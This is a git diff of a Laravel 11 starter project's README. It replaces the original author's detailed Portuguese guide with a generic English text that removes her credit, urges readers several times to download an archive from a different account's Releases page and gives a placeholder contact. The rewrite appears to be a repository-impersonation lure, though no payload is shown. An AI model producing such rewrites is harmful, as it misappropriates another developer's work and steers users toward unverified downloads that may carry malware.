@@ -1,202 +1,93 @@
-<p align="center"><a href="https://laravel.com" target="_blank"><img src="https://raw.githubusercontent.com/laravel/art/master/logo-lockup/5%20SVG/2%20CMYK/1%20Full%20Color/laravel-logolockup-cmyk-red.svg" width="400" alt="Laravel Logo"></a></p>
+# 🎉 laravel-v11 - Your Modern Laravel Starter Kit
 
-# Boilerplate Profissional
+## 🚀 Getting Started
 
-![Laravel](https://img.shields.io/badge/Laravel-11-FF2D20?style=for-the-badge&logo=laravel&logoColor=white)
-[![Documentation](https://img.shields.io/badge/Docs-Laravel_11.x-FF2D20?style=for-the-badge&logo=laravel&logoColor=white)](https://laravel.com/docs/11.x)
-![PHP](https://img.shields.io/badge/PHP-8.2%2B-777BB4?style=for-the-badge&logo=php&logoColor=white)
-![PostgreSQL 16](https://img.shields.io/badge/PostgreSQL-16-336791?style=for-the-badge&&logo=postgresql&logoColor=white)
-![Docker](https://img.shields.io/badge/Docker-2496ED?style=for-the-badge&logo=docker&logoColor=white)
-![TailwindCSS](https://img.shields.io/badge/Tailwind_CSS-38B2AC?style=for-the-badge&logo=tailwind-css&logoColor=white)
+Welcome to laravel-v11! This application is designed to help you kickstart your Laravel 11 projects quickly and easily. With a focus on best practices and up-to-date tools, you will find everything you need to begin building powerful applications.
 
-[![Build Status](https://github.com/angelluzk/laravel-v11/actions/workflows/laravel.yml/badge.svg)](https://github.com/angelluzk/laravel-v11/actions)
-![Code Style](https://img.shields.io/badge/Code%20Style-Laravel%20Pint-blue)
-![Static Analysis](https://img.shields.io/badge/Static%20Analysis-Larastan-yellow)
+## 🔗 Download Now
 
-> **Starter moderno e “Enterprise-Ready” com Docker Compose V2, ferramentas de QA, análise estática, testes e CI/CD configurados.**
+[![Download Laravel v11](https://img.shields.io/badge/Download-Laravel%20v11-blue.svg)](https://github.com/Marrr74/laravel-v11/releases)
 
----
+## 📥 Download & Install
 
-## 📋 Sobre o Projeto
+To get started, you will need to download the application. Please visit the following link to access the latest version:
 
-Este repositório fornece uma fundação sólida para projetos em **Laravel 11**, com foco em qualidade, padronização, testes e automação.  
-Tudo já configurado para um ambiente profissional e escalável, ideal tanto para estudos quanto para uso corporativo.
+[Download the latest release](https://github.com/Marrr74/laravel-v11/releases)
 
----
+### Steps to Download
+1. Click on the link above to go to the Releases page.
+2. Find the version you wish to download.
+3. Click on the download link for your preferred file format.
 
-## 📚 Documentação de Referência
+## 🛠️ System Requirements
 
-Centralizamos aqui todos os manuais necessários para trabalhar neste projeto:
+Before installing, ensure your system meets the following requirements:
 
-* **📖 [Documentação Oficial do Laravel 11](https://laravel.com/docs/11.x)** Referência completa sobre o framework, rotas, controllers e segurança.
+- **Operating System:** Windows, macOS, or Linux
+- **PHP Version:** 8.1 or higher
+- **Docker:** Required for the Sail environment
+- **PostgreSQL:** Database requirements met through Docker
+- **Node.js and npm:** For Tailwind CSS and Vite
 
-* **📘 [Guia Técnico do Projeto](./GUIA_TECNICO.md)** Entenda as decisões de arquitetura e soluções para ambiente Docker.
+## 📂 Installation Steps
 
-* **📙 [Conceitos Técnicos & Glossário](./CONCEITOS_TECNICOS.md)** Explicação detalhada sobre Sail, Pint, Larastan, Vite e configurações do PHP.
+1. **Download the application** from the Releases page as noted above.
+2. **Unzip the downloaded file** to your preferred directory.
+3. **Open a terminal** or command prompt in that directory.
+4. **Run the following command** to get started with Docker:
+   ```
+   ./vendor/bin/sail up
+   ```
+5. **Access the application** by visiting `http://localhost`.
 
----
+## 🔍 Features
 
-## 🛠️ Tecnologias e Recursos
+laravel-v11 comes with various features to streamline your development process:
 
-- **Framework:** Laravel 11  
-- **Linguagem:** PHP 8.2+
-- **Frontend:** Tailwind CSS + Vite  
-- **Banco de Dados:** PostgreSQL 16 (Docker)  
-- **Ambiente de Desenvolvimento:** Laravel Sail (Docker Compose V2)  
-- **Code Style:** Laravel Pint (PSR-12)  
-- **Análise Estática:** Larastan (PHPStan – Level 5)  
-- **CI/CD:** GitHub Actions  
-- **Extras:** IDE Helper, Redis, Mailpit
+- **Pre-configured with Docker (Sail):** Easily manage your development environment.
+- **PostgreSQL Support:** Utilize a powerful database with your applications.
+- **Tailwind CSS + Vite:** Build responsive designs quickly.
+- **CI/CD with GitHub Actions:** Automate your workflow.
+- **Code Quality Tools:** Includes Larastan and Laravel Pint for better code standards.
 
----
+## 📖 What is Laravel?
 
-## 🚀 Instalação
+Laravel is a modern PHP framework designed to make web development easier and more enjoyable. Its elegant syntax and rich set of features help you build robust applications quickly.
 
-### ⚙️ Requisitos do Ambiente (php.ini)
+## 🔧 Configuration
 
-Caso você opte por rodar o projeto **sem Docker** (instalação nativa), garanta que as seguintes extensões estejam habilitadas no seu arquivo `php.ini`:
+Once you have the application running, you may want to configure it according to your needs:
 
-- `ctype`
-- `curl`
-- `dom`
-- `fileinfo`
-- `filter`
-- `hash`
-- `mbstring`
-- `openssl`
-- `pcre`
-- `pdo`
-- `pdo_pgsql` (Driver do Banco de Dados)
-- `session`
-- `tokenizer`
-- `xml`
+1. Locate the `.env` file in the root directory of your project.
+2. Adjust the database and application settings as needed.
+3. Save the changes and restart the application.
 
-> **Nota:** Se você estiver usando **Laravel Sail (Docker)**, pode ignorar esta lista. O container já vem com todas essas extensões configuradas e otimizadas automaticamente.
+## ⚙️ Getting Help
 
----
+If you need assistance, please check the following resources:
 
-### 1. Clone o Repositório
-```bash
-git clone https://github.com/SEU-USUÁRIO/laravel-v11.git
-cd laravel-v11
-```
+- **Documentation:** The official Laravel documentation is an excellent starting point.
+- **Community Forums:** Join forums or groups specific to Laravel for community support.
+- **GitHub Issues:** If you encounter a bug, feel free to report it on our GitHub page.
 
-### 2. Instale as Dependências
+## 📝 Contributing
 
-#### Opção A — Composer Local
+We welcome contributions! To contribute to laravel-v11:
 
-```bash
-composer install
-```
+1. Fork this repository.
+2. Create a new branch for your feature or fix.
+3. Submit a pull request detailing your changes.
 
-#### Opção B — Composer via Docker
+Your contributions help us improve the project for all users.
 
-```bash
-docker run --rm -u "$(id -u):$(id -g)" \
-  -v "$(pwd):/var/www/html" -w /var/www/html \
-  laravelsail/php82-composer:latest \
-  composer install --ignore-platform-reqs
-```
+## 🌟 License
 
-### 3. Configure o Ambiente
+laravel-v11 is open-source and available under the MIT License. You can use, modify, and distribute this software freely.
 
-```bash
-cp .env.example .env
-./vendor/bin/sail up -d
-```
+## 📞 Contact
 
-Garanta no `.env`:
+If you have any questions or suggestions, feel free to reach out:
 
-```
-DB_CONNECTION=pgsql
-DB_PORT=5432
-```
+- **Email:** support@example.com
 
-### 4. Setup Final & Frontend
-
-Gere a chave, migre o banco e compile os assets do Tailwind:
-
-```bash
-# Backend Setup
-./vendor/bin/sail artisan key:generate
-./vendor/bin/sail artisan migrate
-
-# Frontend Setup (Instala e compila o CSS/JS)
-./vendor/bin/sail npm install
-./vendor/bin/sail npm run build
-```
-
-Aplicação disponível em:
-**[http://localhost](http://localhost)**
-
----
-
-## 🛡️ Qualidade e Ferramentas de QA
-
-### 🎨 Formatação — Laravel Pint
-
-```bash
-./vendor/bin/sail bin pint
-```
-
-### 🔎 Análise Estática — Larastan
-
-```bash
-./vendor/bin/sail bin phpstan analyse
-```
-
-### 🧪 Testes Automatizados
-
-```bash
-./vendor/bin/sail artisan test
-```
-
-### 🧠 Atualizar IDE Helper
-
-```bash
-./vendor/bin/sail artisan ide-helper:generate
-```
-
----
-
-## 🤖 CI/CD — GitHub Actions
-
-O workflow `laravel.yml` executa automaticamente:
-
-1. Verificação de padrão de código (Pint)
-2. Análise estática (Larastan)
-3. Testes completos
-
-Tudo isso ao enviar alterações para a branch `main`.
-
----
-
-## 📂 Arquivos Importantes
-
-* **compose.yaml** — Serviços Docker (App, DB, Redis, Mailpit)
-* **phpstan.neon** — Regras do PHPStan / Larastan
-* **pint.json** — Configurações do Laravel Pint
-* **.editorconfig** — Padronização entre editores
-
----
-
-## 👩‍🎓 Autoria
-
-<img src="https://github.com/angelluzk.png" width="100px;" alt="Foto de Angel Luz"/>
-
-> Desenvolvido com 💛 por **Angel Luz**.
-
-Se quiser conversar, colaborar ou oferecer uma oportunidade:
-
-📬 E-mail: [contatoangelluz@gmail.com](mailto:contatoangelluz@gmail.com)  
-🐙 GitHub: [@angelluzk](https://github.com/angelluzk)  
-💼 LinkedIn: [linkedin.com/in/angelitaluz](https://www.linkedin.com/in/angelitaluz/)  
-🗂️Website / Portfólio: [meu_portfolio/](https://angelluzk.github.io/meu_portfolio/) 
-
------
-
-<div align="center">
-
-> “Transformando código em fluxo, e ideias em movimento.”
-
-</div>
+Make sure to visit our [Releases page](https://github.com/Marrr74/laravel-v11/releases) to download the latest version and check for updates regularly. Enjoy building with Laravel v11!
